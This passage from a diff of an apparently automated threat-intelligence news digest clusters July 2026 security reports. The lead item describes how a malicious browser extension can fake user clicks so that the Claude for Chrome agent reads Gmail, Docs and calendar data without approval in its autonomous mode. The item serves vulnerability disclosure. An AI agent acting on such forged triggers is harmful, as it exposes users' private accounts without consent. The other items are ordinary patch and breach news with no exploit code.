mode based on a parameter in its own URL, with no user action required to unlock it. Advertisement. Scroll to continue reading. The researchers noted that this is not something an attacker can currently exploit, since only the extension itself is meant to construct that URL. But they argue it’s a structural risk, and any future bug that lets an outside script influence how that URL gets built could hand an attacker silent control over a user’s connected accounts. Manifold reported its findings to Anthropic on May 21, shortly after the public disclosure of the ClaudeBleed research. The AI giant described the list of pre-approved tasks as an initial mitigation for ClaudeBleed until a complete fix is rolled out. However, Manifold says none of the eight versions released since appear to patch the vulnerabilities, including the latest 1.0.80. SecurityWeek has reached out to Anthropic for comment. Related : ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Related : UK Government Rolls Out Agentic AI Defense Plan Alongside Industry Pledge Related : AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Pentagon Suspends CMMC Phase 2 as It Rethinks Contractor Cybersecurity Rules Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 Centers Laboratory Data Breach Affects 540,000 Individuals Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Latest News SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims Adobe Patches Critical ColdFusion Vulnerabilities 7 Severe Vulnerabilities Patched in VMware Avi Load Balancer SAP Patches Critical Vulnerabilities in NetWeaver, Approuter, Commerce Cloud US, Allies Warn of Russian Cyberattacks Targeting Critical Infrastructure Route
+AI security firm Manifold says two vulnerabilities it reported to Anthropic in May remain exploitable in the latest version of Claude for Chrome, the company’s agentic browser extension. According to Manifold, the flaws let a malicious browser extension trigger Claude into taking actions on a user’s behalf without any genuine click or approval from the victim. An attacker could exploit them to read Gmail messages, Google Docs documents, and calendar entries. The core issue is related to a fix Anthropic shipped earlier this year in response to a similar vulnerability dubbed ClaudeBleed . That update restricted which prompts an outside webpage could feed into Claude, narrowing the extension’s exposure to a fixed set of pre-approved tasks. Manifold found that the mechanism used to activate those tasks doesn’t verify whether a click actually came from a real user, meaning another extension can fake the interaction and set the process in motion. In the extension’s default setting, the attack triggers a confirmation prompt before anything sensitive happens. However, if a user has enabled the extension’s more autonomous mode (‘Act without asking’), the attacker’s action can proceed without any visible warning. Manifold also flagged a second, related design gap: a way for Claude’s side panel to launch directly into that no-confirmation mode based on a parameter in its own URL, with no user action required to unlock it. Advertisement. Scroll to continue reading. The researchers noted that this is not something an attacker can currently exploit, since only the extension itself is meant to construct that URL. But they argue it’s a structural risk, and any future bug that lets an outside script influence how that URL gets built could hand an attacker silent control over a user’s connected accounts. Manifold reported its findings to Anthropic on May 21, shortly after the public disclosure of the ClaudeBleed research. The AI giant described the list of pre-approved tasks as an initial mitigation for ClaudeBleed until a complete fix is rolled out. However, Manifold says none of the eight versions released since appear to patch the vulnerabilities, including the latest 1.0.80. SecurityWeek has reached out to Anthropic for comment. Related : ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Related : UK Government Rolls Out Agentic AI Defense Plan Alongside Industry Pledge Related : AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Pentagon Suspends CMMC Phase 2 as It Rethinks Contractor Cybersecurity Rules Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 Centers Laboratory Data Breach Affects 540,000 Individuals Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Latest News Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims Adobe Patches Critical ColdFusion Vulnerabilities 7 Severe Vulnerabilities Patched in VMware Avi Load Balancer SAP Patches Critical Vulnerabilities in NetWeaver, Approuter, Commerce Cloud US,
 ```
 
 #### Corroborating sources (2)
@@ -1825,55 +1758,6 @@ AI security firm Manifold says two vulnerabilities it reported to Anthropic in M
   - Published: 2026-07-13T11:37:05+00:00
   - Link: https://thehackernews.com/2026/07/thinking-fast-and-slow-in-soc-case-for.html
   - Summary: A few days ago, I was sitting with the CISO of a Fortune 50 company, walking through how his security team was thinking about AI agents in the SOC. Smart team. Serious program. They had already connected Claude to a few detection tools and were seeing real value in specific investigations. But as we mapped out the broader architecture, something kept nagging at me. The design they were building
-
-### Cluster ae25d6203b — score 11
-
-- Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-14T18:17:57+00:00
-- Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2026-44747
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ddos
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- cve_ids: CVE-2026-27690, CVE-2026-44747, CVE-2026-44761
-- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ddos, active_exploitation
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- cve_ids: CVE-2026-44747, CVE-2026-27690, CVE-2026-44761
-- urgency_signals: actively_exploited, preauth_unauth, critical_cvss
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
-```
-
-#### Full body
-
-```
-SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data  Ravie Lakshmanan  Jul 14, 2026 Enterprise Security / Vulnerability SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could lead to unauthorized data access, modification, or system unavailability. "As a temporary workaround the note proposes to disable all ICF nodes with a specific property in transaction SICF," SAP security firm Onapsis said . "Since the workaround will disable opening transactions in SAP GUI for HTML, it is not an option for all customers and it is strongly recommended to install the patching ABAP Kernel version." Also addressed by SAP are two other critical vulnerabilities - CVE-2026-27690 (CVSS score: 9.1) - An HTTP request/response smuggling flaw in SAP Approuter deployments in non-Cloud Foundry environments that allows an unauthenticated attacker to send a specially crafted HTTP request that leads to request-response desynchronization and results in the exposure of user responses and triggers denial-of-service (DoS) attacks. CVE-2026-44761 (CVSS score: 9.1) - A use of default credentials flaw in SAP Commerce Cloud that could retain a sample OAuth 2.0 client with publicly documented sample credentials originating from a sample configuration provided in SAP Help Portal documentation. "If left unchanged, an unauthenticated attacker could use these well-known credentials to obtain a valid access token and invoke certain APIs to read and modify data," according to a description of CVE-2026-44761 in the NIST National Vulnerability Database (NVD). "Successful exploitation results in high impact on confidentiality and integrity, with no impact on availability." Onapsis noted that the vulnerability stems from sample configuration scripts previously provided in the SAP Help Portal. These scripts, originally meant for development and testing, configure OAuth 2.0 clients with hard-coded, well-known credentials. "Older versions of the documentation did not explicitly warn customers against importing these default settings into production," it noted. "An unauthenticated attacker can leverage these publicly available, default credentials to obtain a valid access token. With this token, they can invoke specific APIs to read and alter system data. Exploitation requires that the customer executed the sample script and retained the resulting OAuth 2.0 client in production without replacing the hard-coded secret." It's worth noting that customers who removed the sample client or replaced the secret with a strong, unique value are not impacted by the bug. Customers are recommended to audit their production environments for the presence of the affected sample OAuth 2.0 client. If the client exists, it must be removed. Although there is no evidence of the flaws being exploited in the wild, it's advised to apply the necessary updates for optimal protection. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  API Security , Application Security , Authentication Security , Cloud security , data security , denial of service , enterprise security , SAP , Vulnerability , Web Security ⚡ Top Stories This Week 16-Year-Old Linux KVM Flaw Lets Guest VMs Escape to Host on Intel and AMD x86 Systems BeyondTrust Patches Critical Auth Bypass Flaws in Remote Support and PRA Court Filing Reveals Windows Device ID Helped FBI Trace Alleged Scattered Spider Hacker Rogue Agent Flaw Could Have Let Attackers Hijack Google Dialogflow CX Chatbots RedWing MaaS Packages Android Bank Fraud as a Telegram Rental Service 15-Year-O
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
-  - Published: 2026-07-14T18:17:57+00:00
-  - Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
-  - Summary: SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
 
 ### Cluster f8c7235a08 — score 11
 
@@ -2249,6 +2133,39 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 13th July 
   - Link: https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 13th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES U.S. auto insurer AssuranceAmerica has disclosed a data breach affecting approximately 7 million people. Attackers targeted an employee and used compromised credentials to access company systems, stealing names, contact information, driver’s license […] The post 13th July – Threat Intelligence Report appeared first on Check Point Research .
 
+### Cluster 7f5a4d58f9 — score 10
+
+- Title: Microsoft Patch Tuesday July 2026 - The AI Acopolypse is Here , (Tue, Jul 14th)
+- Source: SANS Internet Storm Center (government_authoritative)
+- Published: 2026-07-14T19:14:58+00:00
+- Link: https://isc.sans.edu/diary/rss/33154
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+This patch Tuesday includes a staggering&#;x26;#;xc2;&#;x26;#;xa0;622 vulnerabilities, not including another 427 vulnerabilities in Chromium, affecting Microsoft&#;x26;#;39;s Edge browser. 62 of the vulnerabilities are rated critical. One was disclosed before today, and two have already been exploited.
+```
+
+#### Corroborating sources (1)
+
+- **SANS Internet Storm Center** (government_authoritative)
+  - Title: Microsoft Patch Tuesday July 2026 - The AI Acopolypse is Here , (Tue, Jul 14th)
+  - Published: 2026-07-14T19:14:58+00:00
+  - Link: https://isc.sans.edu/diary/rss/33154
+  - Summary: This patch Tuesday includes a staggering&#;x26;#;xc2;&#;x26;#;xa0;622 vulnerabilities, not including another 427 vulnerabilities in Chromium, affecting Microsoft&#;x26;#;39;s Edge browser. 62 of the vulnerabilities are rated critical. One was disclosed before today, and two have already been exploited.
+
 ### Cluster 4dacf306cd — score 10
 
 - Title: Meeting the ECB’s AI-Enabled Cybersecurity Mandate with NodeZero®
@@ -2380,6 +2297,47 @@ June 2026 CVE Landscape In June 2026, Insikt Group® identified 60 high-impact v
   - Link: https://www.recordedfuture.com/blog/june-2026-cve-landscape
   - Summary: In June 2026, Insikt Group® identified 60 high-impact vulnerabilities that should be prioritized for remediation, 30 of which had a Very Critical Recorded Future Risk Score. This represents a 49% increase from last month.
 
+### Cluster 1e00f96258 — score 10
+
+- Title: Rapid7 and Mindshare Partner to Accelerate Cyber Resilience Across the Middle East
+- Source: Rapid7 (offensive_vulnerability_research)
+- Published: 2026-07-14T08:00:00+00:00
+- Link: https://www.rapid7.com/blog/post/c-rapid7-mindware-middle-east-cybersecurity-partnership
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: critical_infrastructure
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- affected_industries: critical_infrastructure
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help
+```
+
+#### Full body
+
+```
+Back to Blog Culture Rapid7 and Mindshare Partner to Accelerate Cyber Resilience Across the Middle East Gopan Sivasankaran Jul 14, 2026 | Last updated on Jul 14, 2026 | 4 min read DISCOVER RAPID7 MDR Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help simplify security operations, strengthen cyber resilience, and deliver measurable outcomes. That's why Rapid7 is excited to announce a new strategic, Middle East-spanning distribution partnership with Mindware . A shared commitment to the region The Middle East continues to establish itself as one of the world's most ambitious digital economies. As organizations invest in cloud technologies, AI, and connected infrastructure, cybersecurity has become a critical foundation for sustainable growth. This is precisely why Rapid7 has continued to invest in the Middle East: We recognize the region's growing importance to the global cybersecurity landscape, and this new partnership with Mindware represents another important step in that journey. This collaboration is about more than expanding our channel presence, it's about investing in the partners helping organizations navigate an increasingly complex security landscape. Mindware has built a strong reputation as one of the Middle East's leading value-added distributors, combining deep regional expertise with technical enablement, professional services, and an extensive partner ecosystem. Together, we're creating a framework that helps partners grow their cybersecurity practices while delivering greater value to customers. Building stronger security operations Security teams today face a common challenge: too many tools, too many alerts, and not enough time. Organizations are increasingly looking for platforms that bring exposure management, threat detection, and response together to improve visibility and reduce operational complexity. Rapid7's AI-powered cybersecurity operations platform helps organizations unify security operations, reduce risk, and respond to threats with greater speed and confidence. Combined with Mindware's regional market knowledge, partner enablement capabilities, and technical expertise, this partnership will make it easier for organizations across the Middle East to access modern cybersecurity operations through trusted local partners. For those partners, this creates new opportunities to expand managed services, strengthen technical capabilities, and help customers modernize their security operations while supporting long-term business growth. Local expertise alongside global innovation The most successful cybersecurity partnerships combine global innovation with local knowledge. Organizations want world-class technology, but they also expect partners who understand their business environment, regulatory landscape, and operational priorities. By combining Rapid7's cybersecurity innovation with Mindware's established regional ecosystem, we're helping partners fortify and deliver solutions capable of addressing today's unprecedented security challenges and threats. Together, we'll
+```
+
+#### Corroborating sources (1)
+
+- **Rapid7** (offensive_vulnerability_research)
+  - Title: Rapid7 and Mindshare Partner to Accelerate Cyber Resilience Across the Middle East
+  - Published: 2026-07-14T08:00:00+00:00
+  - Link: https://www.rapid7.com/blog/post/c-rapid7-mindware-middle-east-cybersecurity-partnership
+  - Summary: Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help
+
 ### Cluster f0cefbafc4 — score 10
 
 - Title: Security Teams Are Ready To Become More Preemptive. What’s Holding Them Back?
@@ -2419,148 +2377,54 @@ Back to Blog Detection and Response Security Teams Are Ready To Become More Pree
   - Link: https://www.rapid7.com/blog/post/dr-teams-ready-for-preemptive-security-mdr-survey
   - Summary: The shift toward preemptive security is underway, but most organizations are still navigating the realities of limited resources, fragmented tools, and emerging AI risk. At Rapid7’s recent Global Security Summit , we surveyed attendees to better understand where security leaders and practitioners stand today, what is shaping their priorities, and what they need to move forward. Their responses offer a candid view into the current state of security operations: ambitious, increasingly AI-aware, and ready for change, but still working through the practical challenges of getting there. For many teams, the direction is clear: security needs to become more proactive, more connected, and more resilient. Attackers are moving quickly, environments are expanding, and teams are under pressure to reduce risk before it turns into business disruption. But the survey results show that most organizations are still somewhere in the middle of that journey. Where organizations are today One of the cleare
 
-### Cluster 3be6f6fab7 — score 10
+### Cluster 83ac9f2074 — score 10
 
-- Title: Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-07-14T18:01:36+00:00
-- Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ddos, zero_day
-- affected_products: Microsoft BitLocker, Microsoft SharePoint, Microsoft Windows
-- cve_ids: CVE-2026-50661, CVE-2026-56155, CVE-2026-56164
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day, ddos, active_exploitation
-- affected_products: Microsoft BitLocker, Microsoft SharePoint, Microsoft Windows
-- cve_ids: CVE-2026-56155, CVE-2026-56164, CVE-2026-50661
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. [...]
-```
-
-#### Full body
-
-```
-Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days By Lawrence Abrams July 14, 2026 02:01 PM 0 Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. Patch Tuesday addresses 59 "Critical" vulnerabilities, 48 of which are remote code execution, 9 are elevation of privilege, 1 is a security bypass, and 1 is a spoofing. The approximate number of bugs in each vulnerability category is listed below: 254 Elevation of Privilege Vulnerabilities 17 Security Feature Bypass Vulnerabilities 145 Remote Code Execution Vulnerabilities 102 Information Disclosure Vulnerabilities 35 Denial of Service Vulnerabilities 16 Spoofing Vulnerabilities When BleepingComputer reports on Patch Tuesday security updates, we only count those released by Microsoft today. Therefore, the number of flaws does not include flaws in Mariner, Azure OpenAI, Azure Synapse, M365 Copilot, Microsoft Exchange Online, Microsoft Edge for Android, and Microsoft Entra Provisioning Service that were fixed by Microsoft earlier this month. There were also a massive 468 Microsoft Edge/Chromium flaws that were fixed by Google this month, which were excluded from this Patch Tuesday roundup. As part of last month's June Patch Tuesday , Google fixed 360 flaws that were later ported to Microsoft Edge. Last week, Microsoft warned that there would be an increase in Patch Tuesday security updates as it has begun to use an AI-powered vulnerability discovery system to identify more security flaws across its Windows codebase before attackers can exploit them. To learn more about the non-security updates released today, you can review our dedicated articles on the Windows 11 KB5101650 & KB5099414 cumulative updates and the Windows 10 KB5099539 extended security update . Microsoft patches 3 zero-days This month's Patch Tuesday fixes three zero-day vulnerabilities, with two exploited in attacks and one publicly disclosed. Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited while no official fix is available. The two actively exploited zero-days addressed during this month's Patch Tuesday are: CVE-2026-56155 - Active Directory Federation Services Elevation of Privilege Vulnerability Microsoft has patched an actively exploited vulnerability in Active Directory Federation Services that grants administrative privileges. "Insufficient granularity of access control in Active Directory Federation Services (AD FS) allows an authorized attacker to elevate privileges locally," warns Microsoft. Microsoft credited the flaw to Jeremy Kingston and Scott Clark of Microsoft Detection and Response Team (DART), Microsoft's incident response unit, indicating it was likely uncovered while investigating active attacks. Microsoft has not disclosed any details as to how the flaw was exploited in attacks. CVE-2026-56164 - Microsoft SharePoint Server Elevation of Privilege Vulnerability Microsoft has patched an actively exploited flaw in Microsoft SharePoint Server that allows a remote attacker to gain elevated privileges. "Missing authentication for critical function in Microsoft Office SharePoint allows an unauthorized attacker to elevate privileges over a network," explains Microsoft. Microsoft says that enabling the Antimalware Scan Interface (AMSI) on the server and setting the Request Body Scan mode to Full can help mitigate this flaw. No details have been released as to how this flaw was exploited in attacks. Microsoft credited the flaw to Jayson Frost with Mandiant Incident Response, Genwei Jiang with Google Cloud, FLARE OTF, and an anonymous researcher. The publicly disclosed zero-day that was fixed is: CVE-2026-50661 - Windows BitLocker Security Feature Bypass Vulnerability Microsoft has patched a publicly disclosed Windows BitLocker bypass flaw that could allow attackers to gain access to encrypted data. "A successf
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days
-  - Published: 2026-07-14T18:01:36+00:00
-  - Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/
-  - Summary: Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. [...]
-
-### Cluster 5fab32b5e5 — score 10
-
-- Title: Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims
+- Title: Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates
 - Source: SecurityWeek (cyber_news_breach_reporting)
-- Published: 2026-07-14T18:18:45+00:00
-- Link: https://www.securityweek.com/synopsys-finds-no-evidence-of-data-breach-following-bosch-hack-claims/
+- Published: 2026-07-15T07:24:52+00:00
+- Link: https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion, zero_day
-- affected_industries: manufacturing_industrial
-- affected_products: Palo Alto Networks, SonicWall
-- urgency_signals: no_patch_yet, zero_day
-- content_type: incident_report
+- threat_categories: active_exploitation, data_breach, phishing_social_eng, supply_chain, zero_day
+- affected_industries: critical_infrastructure
+- affected_products: Anthropic/Claude, Microsoft 365, Okta
+- cve_ids: CVE-2026-15718, CVE-2026-15719, CVE-2026-15764, CVE-2026-15765
+- urgency_signals: actively_exploited, no_patch_yet, zero_day
+- content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, zero_day, data_breach
-- affected_industries: manufacturing_industrial
-- affected_products: Palo Alto Networks, SonicWall
-- urgency_signals: zero_day, no_patch_yet
-- content_type: incident_report
+- threat_categories: supply_chain, phishing_social_eng, zero_day, data_breach, active_exploitation
+- affected_industries: critical_infrastructure
+- affected_products: Anthropic/Claude, Okta, Microsoft 365
+- cve_ids: CVE-2026-15718, CVE-2026-15719, CVE-2026-15764, CVE-2026-15765
+- urgency_signals: actively_exploited, zero_day, no_patch_yet
+- content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Summary
 
 ```
-The D1R cybercrime group claimed to have stolen valuable data from Synopsys and Bosch, threatening to leak it unless a ransom is paid. The post Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims appeared first on SecurityWeek .
+Public exploit code targeting the Firefox flaws exists, but no in-the-wild exploitation has been observed. The post Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates appeared first on SecurityWeek .
 ```
 
 #### Full body
 
 ```
-Silicon-to-systems design firm Synopsys says it has found no evidence of a data breach after a cybercrime group claimed to have hacked its systems and gained access to valuable data belonging to one of its major customers, Bosch. A new ransomware group named D1R in recent days listed Synopsys and Bosch on its Tor-based leak website. The cybercriminals claimed to have exploited a vulnerability in Synopsys’ website to access a corporate client database containing 40,000 entries, and they are threatening to leak the stolen data unless a ransom is paid. Separately, D1R claimed to have hacked German engineering and technology giant Bosch using data obtained from Synopsys. The cybercriminals allegedly obtained valuable intellectual property belonging to Bosch. Synopsys specializes in electronic design automation software and pre-designed semiconductor blueprints used to build and test microchips. The company supplies the software tools and digital chip blueprints that Bosch’s engineering teams rely on to design electronic components for modern vehicles and industrial systems. However, Synopsys told SecurityWeek that it has found no evidence to support the hackers’ claims. “The security of data and systems is a priority for Synopsys,” the company said. “We are continuously monitoring our network and have found no evidence of Synopsys or customer technical data being subject to unauthorized access. We have not been contacted by this threat actor and, based on our investigation, claims of unauthorized access to customer confidential data are unfounded.” Advertisement. Scroll to continue reading. Indeed, a screenshot of a document the hackers posted to prove access to Bosch data appears to be from a user manual that is already in the public domain. It’s not uncommon for cybercriminals to leak fake data or exaggerate the scope of their hacks. When contacted by SecurityWeek , Bosch declined to answer specific questions about the incident, offering a standard boilerplate statement instead: Bosch places great importance on cybersecurity. As a globally networked industrial company, Bosch continuously strengthens the protection of its digital systems and expands its capabilities to respond quickly and in a coordinated manner to potential cyber incidents. The goal is to protect critical systems based on risk and limit the impact of potential attacks. In this way, cybersecurity makes a significant contribution to Bosch’s reliability, operational capability, and resilience. Related : Accenture Confirms Data Breach After Hacker Claims Source Code Theft Related : Centers Laboratory Data Breach Affects 540,000 Individuals Related : 12 Million Impacted by Data Breach at Japanese Telco KDDI Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Pentagon Suspends CMMC Phase 2 as It Rethinks Contractor Cybersecurity Rules Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 Centers Laboratory Data Breach Affects 540,000 Individuals Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Latest News SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Adobe Patches Critical ColdFusion Vulnerabilities 7 Severe Vulnerabilities Patched in VMware Avi Load Balancer Unpatched Claude
+Google and Mozilla have released fresh Chrome 150 and Firefox 152 updates that resolve critical-severity vulnerabilities. Mozilla rolled out Firefox 152.0.6 with patches for two critical security defects, warning that exploit code has been published for both. The bugs are tracked as CVE-2026-15718 and CVE-2026-15719, and are described as an invalid pointer in the ‘JavaScript: WebAssembly’ component and a site isolation issue in the ‘DOM: Navigation’ component. “We are aware that exploit code for this is public however we are not aware of any attacks in the wild abusing this flaw,” Mozilla notes for both weaknesses. Google fixed 15 vulnerabilities with the latest Chrome update , including two critical use-after-free flaws in Ozone, tracked as CVE-2026-15764 and CVE-2026-15765. The browser refresh also resolves 12 high-severity bugs across Skia, Libyuv, HTML-in-Canvas, Linux Toolkit Theming, V8, Media, GPU, Core, and UI, including uninitialized use, heap buffer overflow, insufficient policy enforcement, insufficient validation of untrusted input, and use-after-free issues. Advertisement. Scroll to continue reading. Only three of these security defects were reported by external researchers, while the rest were discovered by Google. The internet giant has yet to disclose the bug bounty amounts paid to the researchers. Google makes no mention of any of the patched vulnerabilities being exploited in the wild. The latest Chrome iteration is now rolling out as versions 150.0.7871.124/.125 for Windows and macOS and as version 150.0.7871.124 for Linux. Related: SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Related: Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Related: Adobe Patches Critical ColdFusion Vulnerabilities Related: 7 Severe Vulnerabilities Patched in 